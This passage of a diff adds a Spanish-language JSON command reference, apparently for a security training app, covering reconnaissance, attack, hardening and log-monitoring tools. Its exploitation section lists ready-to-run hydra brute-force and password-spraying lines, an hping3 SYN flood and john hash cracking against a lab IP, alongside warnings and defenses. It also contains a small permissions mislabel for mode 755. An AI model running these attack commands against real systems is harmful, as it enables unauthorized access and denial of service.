+              { "flag": "-W", "description": "Tiempo de espera para respuesta" },
+              { "flag": "-f", "description": "Flood ping (requiere privilegios root)" }
+            ],
+            "useCases": [
+              "Verificar conectividad básica de red",
+              "Medir latencia y pérdida de paquetes",
+              "Diagnóstico de problemas de red",
+              "Verificar si un host está activo"
+            ]
+          },
+          {
+            "name": "traceroute",
+            "fullName": "Trace Route",
+            "description": "Muestra la ruta que toman los paquetes para llegar a un destino.",
+            "syntax": "traceroute [opciones] [destino]",
+            "category": "reconnaissance",
+            "team": "both",
+            "examples": [
+              {
+                "command": "traceroute 10.0.10.5",
+                "description": "Muestra la ruta completa al destino"
+              },
+              {
+                "command": "traceroute -n 10.0.10.5",
+                "description": "No resuelve nombres de host (más rápido)"
+              },
+              {
+                "command": "traceroute -m 20 10.0.10.5",
+                "description": "Máximo 20 saltos"
+              }
+            ],
+            "commonFlags": [
+              { "flag": "-n", "description": "No resuelve nombres DNS" },
+              { "flag": "-m", "description": "Número máximo de saltos" },
+              { "flag": "-w", "description": "Tiempo de espera por respuesta" },
+              { "flag": "-I", "description": "Usa ICMP ECHO en lugar de UDP" }
+            ],
+            "useCases": [
+              "Identificar cuellos de botella en la red",
+              "Descubrir la topología de red",
+              "Diagnosticar problemas de enrutamiento",
+              "Mapear la infraestructura de red del objetivo"
+            ]
+          },
+          {
+            "name": "ss",
+            "fullName": "Socket Statistics",
+            "description": "Muestra estadísticas de sockets de red. Reemplazo moderno de netstat.",
+            "syntax": "ss [opciones]",
+            "category": "reconnaissance",
+            "team": "blue",
+            "examples": [
+              {
+                "command": "ss -tulnp",
+                "description": "Muestra todos los puertos TCP/UDP escuchando con procesos"
+              },
+              {
+                "command": "ss -s",
+                "description": "Muestra estadísticas de sockets"
+              },
+              {
+                "command": "ss -a",
+                "description": "Muestra todos los sockets (establecidos y escuchando)"
+              },
+              {
+                "command": "ss state established",
+                "description": "Muestra solo conexiones establecidas"
+              }
+            ],
+            "commonFlags": [
+              { "flag": "-t", "description": "Muestra sockets TCP" },
+              { "flag": "-u", "description": "Muestra sockets UDP" },
+              { "flag": "-l", "description": "Muestra sockets escuchando" },
+              { "flag": "-n", "description": "No resuelve nombres de servicio" },
+              { "flag": "-p", "description": "Muestra el proceso usando el socket" },
+              { "flag": "-a", "description": "Muestra todos los sockets" },
+              { "flag": "-s", "description": "Muestra estadísticas de sockets" }
+            ],
+            "useCases": [
+              "Detectar puertos abiertos y servicios escuchando",
+              "Identificar conexiones sospechosas",
+              "Monitoreo de red en tiempo real",
+              "Análisis de tráfico de red"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "exploitation",
+        "name": "Explotación y Ataque",
+        "icon": "swords",
+        "color": "bg-red-600",
+        "description": "Herramientas para pruebas de penetración y explotación de vulnerabilidades",
+        "commands": [
+          {
+            "name": "hydra",
+            "fullName": "THC Hydra",
+            "description": "Herramienta de fuerza bruta para múltiples protocolos de autenticación.",
+            "syntax": "hydra [opciones] [servidor] [servicio]",
+            "category": "exploitation",
+            "team": "red",
+            "examples": [
+              {
+                "command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.10.5",
+                "description": "Ataque de fuerza bruta SSH con wordlist"
+              },
+              {
+                "command": "hydra -L users.txt -P pass.txt 10.0.10.5 http-post-form \"/login:user=^USER^&pass=^PASS^:F=incorrect\"",
+                "description": "Ataque a formulario web con listas de usuarios y contraseñas"
+              },
+              {
+                "command": "hydra -l root -P passwords.txt -t 4 ftp://10.0.10.5",
+                "description": "Ataque FTP con 4 hilos paralelos"
+              },
+              {
+                "command": "hydra -L users.txt -p password123 smb://10.0.10.5",
+                "description": "Password spraying contra SMB"
+              }
+            ],
+            "commonFlags": [
+              { "flag": "-l", "description": "Usuario específico" },
+              { "flag": "-L", "description": "Lista de usuarios" },
+              { "flag": "-p", "description": "Contraseña específica" },
+              { "flag": "-P", "description": "Lista de contraseñas" },
+              { "flag": "-t", "description": "Número de hilos paralelos" },
+              { "flag": "-w", "description": "Tiempo de espera entre intentos" },
+              { "flag": "-f", "description": "Detiene al encontrar credenciales válidas" },
+              { "flag": "-V", "description": "Modo verbose (muestra intentos)" },
+              { "flag": "-s", "description": "Puerto específico" }
+            ],
+            "protocols": [
+              "SSH", "FTP", "HTTP/HTTPS", "SMB", "RDP", "MySQL", 
+              "PostgreSQL", "SMTP", "POP3", "IMAP", "VNC", "Telnet"
+            ],
+            "useCases": [
+              "Auditoría de contraseñas débiles",
+              "Pentesting de autenticación",
+              "Recuperación de credenciales",
+              "Pruebas de políticas de contraseñas"
+            ],
+            "warnings": [
+              "⚠️ RUIDOSO: Genera muchos logs y puede activar sistemas de defensa",
+              "⚠️ Puede bloquear cuentas si hay políticas de lockout",
+              "⚠️ Ilegal sin autorización explícita",
+              "⚠️ Puede causar denegación de servicio no intencional"
+            ],
+            "defenseCounters": [
+              "Implementar fail2ban o sistemas similares",
+              "Políticas de lockout de cuentas",
+              "Autenticación multifactor (MFA)",
+              "Monitoreo de intentos fallidos de login",
+              "Rate limiting en servicios de autenticación"
+            ]
+          },
+          {
+            "name": "hping3",
+            "fullName": "hping version 3",
+            "description": "Generador y analizador de paquetes TCP/IP. Útil para pruebas de firewall y ataques DoS.",
+            "syntax": "hping3 [opciones] [objetivo]",
+            "category": "exploitation",
+            "team": "red",
+            "examples": [
+              {
+                "command": "hping3 -S 10.0.10.5 -p 80",
+                "description": "Envía paquetes SYN al puerto 80"
+              },
+              {
+                "command": "hping3 --flood -S 10.0.10.5",
+                "description": "SYN flood (ataque DoS)"
+              },
+              {
+                "command": "hping3 -1 10.0.10.5",
+                "description": "Envía paquetes ICMP (ping mejorado)"
+              },
+              {
+                "command": "hping3 -S -p ++1 10.0.10.5",
+                "description": "Escaneo de puertos incrementando el puerto de destino"
+              }
+            ],
+            "commonFlags": [
+              { "flag": "-S", "description": "Establece flag SYN" },
+              { "flag": "-A", "description": "Establece flag ACK" },
+              { "flag": "-F", "description": "Establece flag FIN" },
+              { "flag": "-p", "description": "Puerto de destino" },
+              { "flag": "--flood", "description": "Modo flood (envía paquetes lo más rápido posible)" },
+              { "flag": "-c", "description": "Número de paquetes a enviar" },
+              { "flag": "-i", "description": "Intervalo entre paquetes" },
+              { "flag": "-1", "description": "Modo ICMP" },
+              { "flag": "-2", "description": "Modo UDP" },
+              { "flag": "-a", "description": "Falsifica dirección IP de origen" }
+            ],
+            "useCases": [
+              "Pruebas de reglas de firewall",
+              "Evasión de IDS/IPS",
+              "Simulación de ataques DoS",
+              "Auditoría de seguridad de red",
+              "Traceroute avanzado"
+            ],
+            "warnings": [
+              "⚠️ MUY RUIDOSO: Detectado fácilmente por IDS/IPS",
+              "⚠️ Puede causar denegación de servicio real",
+              "⚠️ Requiere permisos root",
+              "⚠️ Uso malicioso es ilegal"
+            ],
+            "defenseCounters": [
+              "Implementar rate limiting en firewall",
+              "Configurar SYN cookies para prevenir SYN flood",
+              "Monitoreo de tráfico anómalo con IDS",
+              "Filtrado de paquetes con direcciones IP falsificadas"
+            ]
+          },
+          {
+            "name": "john",
+            "fullName": "John the Ripper",
+            "description": "Crackeador de contraseñas offline. Soporta múltiples formatos de hash.",
+            "syntax": "john [opciones] [archivo_hash]",
+            "category": "exploitation",
+            "team": "red",
+            "examples": [
+              {
+                "command": "john hashes.txt",
+                "description": "Cracking con wordlist por defecto"
+              },
+              {
+                "command": "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt",
+                "description": "Cracking con wordlist personalizada"
+              },
+              {
+                "command": "john --format=NT hashes.txt",
+                "description": "Especifica formato de hash (NTLM)"
+              },
+              {
+                "command": "john --show hashes.txt",
+                "description": "Muestra contraseñas crackeadas"
+              }
+            ],
+            "commonFlags": [
+              { "flag": "--wordlist", "description": "Especifica archivo de wordlist" },
+              { "flag": "--format", "description": "Formato de hash (MD5, SHA256, NT, etc.)" },
+              { "flag": "--show", "description": "Muestra contraseñas ya crackeadas" },
+              { "flag": "--incremental", "description": "Modo de fuerza bruta" },
+              { "flag": "--rules", "description": "Aplica reglas de mutación" }
+            ],
+            "supportedHashes": [
+              "MD5", "SHA-1", "SHA-256", "SHA-512", "NTLM", "bcrypt", 
+              "Linux shadow", "Windows LM/NT", "MySQL", "PostgreSQL", "Office"
+            ],
+            "useCases": [
+              "Auditoría de contraseñas",
+              "Recuperación de contraseñas",
+              "Análisis de fortaleza de contraseñas",
+              "Pentesting post-explotación"
+            ]
+          },
+          {
+            "name": "nikto",
+            "fullName": "Nikto Web Scanner",
+            "description": "Escáner de vulnerabilidades de servidores web.",
+            "syntax": "nikto -h [host]",
+            "category": "exploitation",
+            "team": "red",
+            "examples": [
+              {
+                "command": "nikto -h http://10.0.10.5",
+                "description": "Escaneo básico de servidor web"
+              },
+              {
+                "command": "nikto -h http://10.0.10.5 -ssl",
+                "description": "Escaneo de servidor HTTPS"
+              },
+              {
+                "command": "nikto -h http://10.0.10.5 -Tuning 123",
+                "description": "Escaneo específico (1=XSS, 2=SQLi, 3=Directory traversal)"
+              }
+            ],
+            "commonFlags": [
+              { "flag": "-h", "description": "Host objetivo" },
+              { "flag": "-ssl", "description": "Fuerza uso de SSL/TLS" },
+              { "flag": "-port", "description": "Puerto específico" },
+              { "flag": "-Tuning", "description": "Tipo de pruebas a realizar" }
+            ],
+            "useCases": [
+              "Descubrimiento de vulnerabilidades web",
+              "Auditoría de configuración de servidores",
+              "Identificación de versiones obsoletas",
+              "Detección de archivos y directorios sensibles"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "defense-hardening",
+        "name": "Defensa y Hardening",
+        "icon": "shield",
+        "color": "bg-blue-600",
+        "description": "Comandos para asegurar y endurecer sistemas",
+        "commands": [
+          {
+            "name": "ufw",
+            "fullName": "Uncomplicated Firewall",
+            "description": "Frontend simplificado para iptables. Gestión de firewall en Ubuntu/Debian.",
+            "syntax": "sudo ufw [comando]",
+            "category": "defense",
+            "team": "blue",
+            "examples": [
+              {
+                "command": "sudo ufw enable",
+                "description": "Activa el firewall"
+              },
+              {
+                "command": "sudo ufw status",
+                "description": "Muestra el estado y reglas actuales"
+              },
+              {
+                "command": "sudo ufw allow 22/tcp",
+                "description": "Permite SSH (puerto 22)"
+              },
+              {
+                "command": "sudo ufw allow from 192.168.1.0/24 to any port 3306",
+                "description": "Permite MySQL solo desde la subred local"
+              },
+              {
+                "command": "sudo ufw deny 23",
+                "description": "Bloquea Telnet (puerto 23)"
+              },
+              {
+                "command": "sudo ufw deny from 192.168.1.100",
+                "description": "Bloquea una IP específica"
+              },
+              {
+                "command": "sudo ufw delete allow 80",
+                "description": "Elimina una regla"
+              },
+              {
+                "command": "sudo ufw reset",
+                "description": "Resetea el firewall a configuración por defecto"
+              }
+            ],
+            "commonCommands": [
+              { "command": "enable", "description": "Activa el firewall y lo configura para iniciar con el sistema" },
+              { "command": "disable", "description": "Desactiva el firewall" },
+              { "command": "status", "description": "Muestra estado y reglas" },
+              { "command": "status numbered", "description": "Muestra reglas numeradas" },
+              { "command": "allow", "description": "Permite tráfico" },
+              { "command": "deny", "description": "Bloquea tráfico" },
+              { "command": "delete", "description": "Elimina una regla" },
+              { "command": "reset", "description": "Elimina todas las reglas" },
+              { "command": "reload", "description": "Recarga las reglas sin interrumpir conexiones" }
+            ],
+            "bestPractices": [
+              "✅ Siempre permitir SSH ANTES de activar el firewall",
+              "✅ Usar el principio de menor privilegio (denegar todo, permitir lo necesario)",
+              "✅ Documentar cada regla con comentarios",
+              "✅ Revisar reglas regularmente con 'status numbered'",
+              "✅ Probar reglas antes de aplicar en producción"
+            ],
+            "useCases": [
+              "Bloquear puertos innecesarios",
+              "Implementar segmentación de red",
+              "Contener ataques de fuerza bruta",
+              "Crear política de firewall zero-trust"
+            ],
+            "securityUseCases": [
+              {
+                "scenario": "Servidor Web Básico",
+                "command": "sudo ufw allow 80/tcp && sudo ufw allow 443/tcp",
+                "description": "Permite tráfico HTTP y HTTPS"
+              },
+              {
+                "scenario": "Bloquear Atacante",
+                "command": "sudo ufw deny from 192.168.1.100",
+                "description": "Bloquea IP maliciosa"
+              }
+            ]
+          },
+          {
+            "name": "fail2ban-client",
+            "fullName": "Fail2Ban Client",
+            "description": "Sistema de prevención de intrusiones que monitorea logs y banea IPs con comportamiento malicioso.",
+            "syntax": "fail2ban-client [comando] [jail] [acción]",
+            "category": "defense",
+            "team": "blue",
+            "examples": [
+              {
+                "command": "fail2ban-client status",
+                "description": "Muestra el estado general"
+              },
+              {
+                "command": "fail2ban-client status sshd",
+                "description": "Estado específico de la jail de SSH"
+              },
+              {
+                "command": "fail2ban-client set sshd banip 192.168.1.100",
+                "description": "Banea manualmente una IP"
+              },
+              {
+                "command": "fail2ban-client set sshd unbanip 192.168.1.100",
+                "description": "Desbanea una IP"
+              }
+            ],
+            "commonCommands": [
+              { "command": "status", "description": "Estado del servicio" },
+              { "command": "status [jail]", "description": "Estado de una jail específica" },
+              { "command": "set [jail] banip [ip]", "description": "Banea una IP" },
+              { "command": "set [jail] unbanip [ip]", "description": "Desbanea una IP" },
+              { "command": "reload", "description": "Recarga la configuración" }
+            ],
+            "commonJails": [
+              "sshd - Protección SSH",
+              "apache-auth - Autenticación Apache",
+              "nginx-limit-req - Rate limiting Nginx",
+              "postfix - Servidor de correo"
+            ],
+            "useCases": [
+              "Prevenir ataques de fuerza bruta",
+              "Protección automática contra escaneos",
+              "Bloqueo de IPs maliciosas",
+              "Complemento de firewall con detección inteligente"
+            ],
+            "configuration": {
+              "location": "/etc/fail2ban/jail.local",
+              "keyParameters": [
+                "bantime - Duración del baneo (ej: 10m, 1h, 1d)",
+                "findtime - Ventana de tiempo para contar intentos",
+                "maxretry - Número de intentos permitidos",
+                "action - Acción a tomar (ban, email, etc.)"
+              ]
+            }
+          },
+          {
+            "name": "chmod",
+            "fullName": "Change Mode",
+            "description": "Cambia los permisos de archivos y directorios en sistemas Unix/Linux.",
+            "syntax": "chmod [opciones] [modo] [archivo]",
+            "category": "defense",
+            "team": "blue",
+            "examples": [
+              {
+                "command": "chmod 640 /var/www/html/db_config.php",
+                "description": "Propietario: lectura/escritura, Grupo: lectura, Otros: ninguno"
+              },
+              {
+                "command": "chmod 700 ~/.ssh",
+                "description": "Permisos seguros para directorio SSH"
+              },
+              {
+                "command": "chmod 600 ~/.ssh/id_rsa",
+                "description": "Permisos seguros para llave privada SSH"
+              },
+              {
+                "command": "chmod u+x script.sh",
+                "description": "Añade permiso de ejecución para el propietario"
+              },
+              {
+                "command": "chmod -R 755 /var/www/html",
+                "description": "Recursivo: directorios ejecutables, archivos legibles"
+              }
+            ],
+            "permissionSystem": {
+              "numeric": {
+                "description": "Sistema octal de 3 dígitos (Propietario-Grupo-Otros)",
+                "values": [
+                  "0 = --- (ningún permiso)",
+                  "1 = --x (ejecución)",
+                  "2 = -w- (escritura)",
+                  "3 = -wx (escritura + ejecución)",
+                  "4 = r-- (lectura)",
+                  "5 = r-x (lectura + ejecución)",
+                  "6 = rw- (lectura + escritura)",
+                  "7 = rwx (todos los permisos)"
+                ]
+              },
+              "symbolic": {
+                "description": "Notación simbólica (u=usuario, g=grupo, o=otros, a=todos)",
+                "operators": [
+                  "+ añade permisos",
+                  "- quita permisos",
+                  "= establece permisos exactos"
+                ],
+                "permissions": [
+                  "r = lectura",
+                  "w = escritura",
+                  "x = ejecución"
+                ]
+              }
+            },
+            "commonPatterns": [
+              { "pattern": "644", "description": "Archivos normales (rw-r--r--)", "use": "Documentos, archivos de configuración" },
+              { "pattern": "640", "description": "Archivos sensibles (rw-r-----)", "use": "Archivos con contraseñas, configs privadas" },
+              { "pattern": "600", "description": "Archivos privados (rw-------)", "use": "Llaves SSH, archivos personales" },
+              { "pattern": "755", "description": "Directorios/ejecutables (rwxr-x---)", "use": "Scripts, directorios públicos" },
+              { "pattern": "750", "description": "Directorios de grupo (rwxr-x---)", "use": "Directorios compartidos por grupo" },
+              { "pattern": "700", "description": "Directorios privados (rwx------)", "use": ".ssh, directorios personales" }
+            ],
+            "securityBestPractices": [
+              "✅ Nunca usar 777 en producción",
+              "✅ Archivos de configuración con DB: 640 o más restrictivo",
+              "✅ Directorio .ssh: 700",
+              "✅ Llaves privadas SSH: 600",
+              "✅ Llaves públicas SSH: 644",
+              "✅ Scripts ejecutables: 750 o 755",
+              "✅ Logs sensibles: 640"
+            ],
+            "commonFlags": [
+              { "flag": "-R", "description": "Recursivo (aplica a todos los archivos y subdirectorios)" },
+              { "flag": "-v", "description": "Verbose (muestra cambios)" },
+              { "flag": "--reference", "description": "Copia permisos de otro archivo" }
+            ],
+            "useCases": [
+              "Asegurar archivos de configuración",
+              "Proteger credenciales y secretos",
+              "Cumplir con políticas de seguridad",
+              "Prevenir acceso no autorizado",
+              "Hardening post-instalación"
+            ]
+          },
+          {
+            "name": "systemctl",
+            "fullName": "System Control",
+            "description": "Controla el sistema systemd y sus servicios.",
+            "syntax": "systemctl [comando] [servicio]",
+            "category": "defense",
+            "team": "blue",
+            "examples": [
+              {
+                "command": "systemctl restart sshd",
+                "description": "Reinicia el servicio SSH para aplicar cambios de configuración"
+              },
+              {
+                "command": "systemctl status apache2",
+                "description": "Muestra el estado del servidor web Apache"
+              },
+              {
+                "command": "systemctl stop telnet.service",
+                "description": "Detiene el servicio Telnet inseguro"
+              },
+              {
+                "command": "systemctl disable telnet.service",
+                "description": "Evita que Telnet se inicie automáticamente"
+              },
+              {
+                "command": "systemctl enable fail2ban",
+                "description": "Configura fail2ban para iniciarse con el sistema"
+              }
+            ],
+            "commonCommands": [
+              { "command": "start", "description": "Inicia un servicio" },
+              { "command": "stop", "description": "Detiene un servicio" },
+              { "command": "restart", "description": "Reinicia un servicio" },
+              { "command": "reload", "description": "Recarga la configuración sin reiniciar" },
+              { "command": "status", "description": "Muestra el estado del servicio" },
+              { "command": "enable", "description": "Habilita inicio automático" },
+              { "command": "disable", "description": "Deshabilita inicio automático" },
+              { "command": "is-active", "description": "Verifica si está activo" },
+              { "command": "is-enabled", "description": "Verifica si está habilitado" }
+            ],
+            "useCases": [
+              "Aplicar cambios de configuración de seguridad",
+              "Deshabilitar servicios innecesarios",
+              "Respuesta a incidentes (detener servicios comprometidos)",
+              "Gestión de servicios de seguridad (firewall, IDS)"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "monitoring-analysis",
+        "name": "Monitoreo y Análisis",
+        "icon": "activity",
+        "color": "bg-green-600",
+        "description": "Herramientas para monitoreo de sistemas y análisis de seguridad",
+        "commands": [
+          {
+            "name": "top",
+            "fullName": "Table of Processes",
+            "description": "Monitor de procesos en tiempo real. Muestra uso de CPU, memoria y procesos activos.",
+            "syntax": "top [opciones]",
+            "category": "monitoring",
+            "team": "blue",
+            "examples": [
+              {
+                "command": "top",
+                "description": "Visualización en tiempo real del sistema"
+              },
+              {
+                "command": "top -u www-data",
+                "description": "Muestra solo procesos del usuario www-data"
+              },
+              {
+                "command": "top -p 1234",
+                "description": "Monitorea un proceso específico por PID"
+              }
+            ],
+            "keyIndicators": [
+              {
+                "metric": "Load Average",
+                "description": "Promedio de carga del sistema (1min, 5min, 15min)",
+                "interpretation": "Valores > número de CPUs indican sobrecarga"
+              },
+              {
+                "metric": "%CPU",
+                "description": "Porcentaje de CPU usado por proceso",
+                "interpretation": "Valores consistentemente altos (>80%) pueden indicar DoS o proceso descontrolado"
+              },
+              {
+                "metric": "%MEM",
+                "description": "Porcentaje de memoria RAM usado",
+                "interpretation": "Monitorear para detectar memory leaks o ataques"
+              },
+              {
+                "metric": "zombie processes",
+                "description": "Procesos terminados pero no limpiados",
+                "interpretation": "Múltiples zombies pueden indicar problemas"
+              }
+            ],
+            "interactiveCommands": [
+              { "key": "k", "action": "Matar un proceso (kill)" },
+              { "key": "r", "action": "Cambiar prioridad (renice)" },
+              { "key": "M", "action": "Ordenar por uso de memoria" },
+              { "key": "P", "action": "Ordenar por uso de CPU" },
+              { "key": "h", "action": "Ayuda" },
+              { "key": "q", "action": "Salir" }
+            ],
+            "useCases": [
+              "Detectar ataques DoS (CPU al 100%)",
+              "Identificar procesos sospechosos",
+              "Monitorear performance del sistema",
+              "Diagnosticar problemas de recursos"
+            ],
+            "securityIndicators": [
+              "🚨 CPU >90% de forma sostenida = Posible DoS",
+              "🚨 Procesos desconocidos con alto uso de recursos",
+              "🚨 Múltiples conexiones de red desde un proceso",
+              "🚨 Procesos ejecutándose como root sin razón"
+            ]
+          },
+          {
+            "name": "htop",
+            "fullName": "Interactive Process Viewer",
+            "description": "Versión mejorada y visual de top con interfaz interactiva.",
+            "syntax": "htop",
+            "category": "monitoring",
+            "team": "blue",
+            "examples": [
+              {
+                "command": "htop",
+                "description": "Interfaz interactiva mejorada"
+              },
+              {
+                "command": "htop -u apache",
+                "description": "Filtra por usuario específico"
+              }
+            ],
+            "advantages": [
+              "Interfaz más intuitiva con colores",
+              "Navegación con mouse",
+              "Visualización de árbol de procesos",
+              "Búsqueda y filtrado más fácil",
+              "Muestra todos los cores de CPU"
+            ],
+            "useCases": [
+              "Alternativa más user-friendly a top",
+              "Análisis visual de recursos",
+              "Gestión interactiva de procesos"
+            ]
+          },
+          {
+            "name": "journalctl",
+            "fullName": "Journal Control",
+            "description": "Consulta los logs del sistema systemd. Esencial para análisis forense y detección de intrusiones.",
+            "syntax": "journalctl [opciones]",
+            "category": "monitoring",
+            "team": "blue",
+            "examples": [
+              {
+                "command": "journalctl -u sshd",
+                "description": "Logs del servicio SSH"
+              },
+              {
+                "command": "journalctl -u sshd --since today",
+                "description": "Logs de SSH de hoy"
+              },
+              {
+                "command": "journalctl -u sshd --since \"2024-01-01 00:00:00\" --until \"2024-01-01 23:59:59\"",
+                "description": "Logs de SSH de una fecha específica"
+              },
+              {
+                "command": "journalctl -p err",
+                "description": "Solo mensajes de error"
+              },
+              {
+                "command": "journalctl -f",
+                "description": "Modo follow (como tail -f)"
+              },
+              {
+                "command": "journalctl _PID=1234",
+                "description": "Logs de un proceso específico"
+              }
+            ],
+            "commonFlags": [
+              { "flag": "-u", "description": "Filtra por unidad/servicio" },
+              { "flag": "-f", "description": "Follow (tiempo real)" },
+              { "flag": "-p", "description": "Filtra por prioridad (emerg, alert, crit, err, warning, notice, info, debug)" },
+              { "flag": "--since", "description": "Desde una fecha/hora" },
+              { "flag": "--until", "description": "Hasta una fecha/hora" },
+              { "flag": "-n", "description": "Número de líneas a mostrar" },
+              { "flag": "-r", "description": "Orden inverso (más recientes primero)" },
+              { "flag": "--no-pager", "description": "Salida sin paginador" }
+            ],
+            "securityUseCases": [
+              {
+                "scenario": "Detectar Fuerza Bruta SSH",
+                "command": "journalctl -u sshd | grep 'Failed password'",
+                "description": "Busca intentos fallidos de login"
+              },
+              {
+                "scenario": "Análisis Post-Incidente",
+                "command": "journalctl --since \"2024-01-15 14:00\" --until \"2024-01-15 15:00\" -p warning",
+                "description": "Logs de alerta durante ventana de incidente"
+              },
+              {
+                "scenario": "Monitoreo en Tiempo Real",
+                "command": "journalctl -f -p err",
+                "description": "Stream de errores en vivo"
+              },
+              {
+                "scenario": "Auditoría de Servicio",
+                "command": "journalctl -u apache2 --since today",
+                "description": "Toda la actividad del servidor web hoy"
+              }
+            ],
+            "forensicsPatterns": [
+              "Failed password for = Fuerza bruta",
+              "Accepted password for = Login exitoso",
+              "Connection closed = Desconexión",
+              "Invalid user = Intento de usuario inexistente",
+              "Break-in attempt = Intento de intrusión detectado"
+            ]
+          },
+          {
+            "name": "grep",
+            "fullName": "Global Regular Expression Print",
+            "description": "Busca patrones de texto en archivos. Fundamental para análisis de logs.",
+            "syntax": "grep [opciones] [patrón] [archivo]",
+            "category": "monitoring",
+            "team": "blue",
+            "examples": [
+              {
+                "command": "grep 'Failed password' /var/log/auth.log",
+                "description": "Busca intentos fallidos de autenticación"
+              },
+              {
+                "command": "grep -i 'error' /var/log/apache2/error.log",
+                "description": "Búsqueda case-insensitive de errores"
+              },
+              {
+                "command": "grep -r 'password' /var/www/html/",
+                "description": "Búsqueda recursiva de contraseñas hardcodeadas"
+              },
+              {
+                "command": "grep -c 'Failed' /var/log/auth.log",
+                "description": "Cuenta número de fallos"
+              },
+              {
+                "command": "grep -E '192\\.168\\.[0-9]+\\.[0-9]+' access.log",
+                "description": "Busca IPs con expresión regular"
+              }
+            ],
+            "commonFlags": [
+              { "flag": "-i", "description": "Case-insensitive" },
+              { "flag": "-r", "description": "Recursivo en directorios" },
+              { "flag": "-v", "description": "Invierte la búsqueda (líneas que NO coinciden)" },
+              { "flag": "-c", "description": "Cuenta las coincidencias" },
+              { "flag": "-n", "description": "Muestra número de línea" },
+              { "flag": "-E", "description": "Expresiones regulares extendidas" },
+              { "flag": "-A", "description": "Muestra N líneas DESPUÉS del match" },
+              { "flag": "-B", "description": "Muestra N líneas ANTES del match" },
+              { "flag": "-C", "description": "Muestra N líneas de CONTEXTO (antes y después)" }
+            ],
+            "securityPatterns": [
+              {
+                "pattern": "grep 'Failed password' /var/log/auth.log | wc -l",
+                "use": "Contar intentos de fuerza bruta"
+              },
+              {
+                "pattern": "grep -E '(error|warning|critical)' /var/log/syslog",
+                "use": "Buscar múltiples niveles de severidad"
+              },
+              {
+                "pattern": "grep -i 'sql' /var/log/apache2/access.log | grep -v 'mysql'",
+                "use": "Detectar posibles inyecciones SQL (excluyendo legítimas)"
+              },
+              {
+                "pattern": "grep -r 'eval(' /var/www/html/ --include='*.php'",
+                "use": "Buscar posibles webshells"
+              }
+            ],
+            "useCases": [
+              "Análisis de logs de seguridad",
+              "Búsqueda de patrones de ataque",
+              "Auditoría de código",
+              "Correlación de eventos"
+            ]
+          },
+          {
+            "name": "ps",
+            "fullName": "Process Status",
+            "description": "Muestra información de procesos en ejecución.",
+            "syntax": "ps [opciones]",
+            "category": "monitoring",
+            "team": "blue",
+            "examples": [
+              {
+                "command": "ps aux",
+                "description": "Lista todos los procesos con detalles"
+              },
+              {
+                "command": "ps aux | grep apache",
+                "description": "Busca procesos de Apache"
+              },
+              {
+                "command": "ps -ef --forest",
+                "description": "Muestra árbol de procesos"
+              },
+              {
+                "command": "ps -u www-data",
+                "description": "Procesos del usuario www-data"
+              }
+            ],
+            "commonFlags": [
+              { "flag": "a", "description": "Todos los procesos con terminal" },
+              { "flag": "u", "description": "Formato orientado al usuario" },
+              { "flag": "x", "description": "Incluye procesos sin terminal" },
+              { "flag": "-e", "description": "Todos los procesos" },
+              { "flag": "-f", "description": "Formato completo" },
+              { "flag": "--forest", "description": "Muestra jerarquía" }
+            ],
+            "useCases": [
+              "Identificar procesos sospechosos",
+              "Verificar servicios en ejecución",
+              "Análisis de uso de recursos",
+              "Caza de amenazas"
+            ],
+            "securityChecks": [
+              "Procesos ejecutándose como root sin razón",
+              "Nombres de proceso inusuales o aleatorios",
+              "Múltiples instancias de un mismo proceso",
+              "Procesos con alto uso de CPU/memoria",
+              "Procesos escuchando en puertos no estándar"
+            ]
+          },
+          {
+            "name": "sha256sum",
+            "fullName": "SHA-256 Checksum",
+            "description": "Calcula y verifica hashes SHA-256 de archivos. Esencial para detección de integridad.",
+            "syntax": "sha256sum [opciones] [archivo]",
+            "category": "monitoring",
+            "team": "blue",
+            "examples": [
+              {
+                "command": "sha256sum /var/www/html/index.php",
+                "description": "Calcula hash de un archivo"
+              },
+              {
+                "command": "sha256sum -c checksums.txt",
+                "description": "Verifica integridad usando archivo de checksums"
+              },
+              {
+                "command": "sha256sum /var/www/html/* > website_hashes.txt",
+                "description": "Crea archivo de checksums para sitio web"
+              }
+            ],
+            "useCases": [
+              "Detectar modificaciones no autorizadas",
+              "Verificar integridad de archivos críticos",
+              "Análisis forense",
+              "Detección de webshells y backdoors"
+            ],
+            "workflowExample": {
+              "step1": "Crear baseline: sha256sum /var/www/html/*.php > baseline.txt",
+              "step2": "Verificar regularmente: sha256sum -c baseline.txt",
+              "step3": "Investigar diferencias si el hash no coincide"
+            },
+            "bestPractices": [
+              "Crear hashes de archivos críticos después de instalación limpia",
+              "Almacenar hashes en ubicación segura (fuera del servidor)",
+              "Automatizar verificación con cron",
+              "Combinar con IDS basado en host (HIDS)"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "system-admin",
+        "name": "Administración de Sistema",
+        "icon": "settings",
+        "color": "bg-gray-600",
+        "description": "Comandos básicos de administración de sistemas Linux",
+        "commands": [
+          {
+            "name": "ssh",
+            "fullName": "Secure Shell",
+            "description": "Protocolo para acceso remoto seguro a sistemas.",
+            "syntax": "ssh [usuario]@[host]",
+            "category": "admin",
+            "team": "both",
+            "examples": [
+              {
+                "command": "ssh root@10.0.10.5",
+                "description": "Conexión SSH como root"
+              },
+              {
+                "command": "ssh -p 2222 admin@10.0.10.5",
+                "description": "Conexión a puerto personalizado"
+              },
+              {
+                "command": "ssh -i ~/.ssh/id_rsa user@10.0.10.5",
+                "description": "Autenticación con llave privada"
+              }
+            ],
+            "commonFlags": [
+              { "flag": "-p", "description": "Puerto específico" },
+              { "flag": "-i", "description": "Archivo de identidad (llave privada)" },
+              { "flag": "-v", "description": "Modo verbose para debugging" },
+              { "flag": "-L", "description": "Port forwarding local" },
+              { "flag": "-D", "description": "Dynamic port forwarding (SOCKS proxy)" }
+            ],
+            "securityBestPractices": [
+              "✅ Deshabilitar PermitRootLogin en /etc/ssh/sshd_config",
+              "✅ Usar autenticación por llave en lugar de contraseña",
+              "✅ Cambiar puerto por defecto (22)",
+              "✅ Implementar fail2ban",
+              "✅ Usar AllowUsers o AllowGroups para limitar acceso",
+              "✅ Habilitar MFA (autenticación multifactor)"
+            ]
+          },
+          {
+            "name": "ls",
+            "fullName": "List",
+            "description": "Lista archivos y directorios.",
+            "syntax": "ls [opciones] [ruta]",
+            "category": "admin",
+            "team": "both",
+            "examples": [
+              {
+                "command": "ls -la /var/www/html",
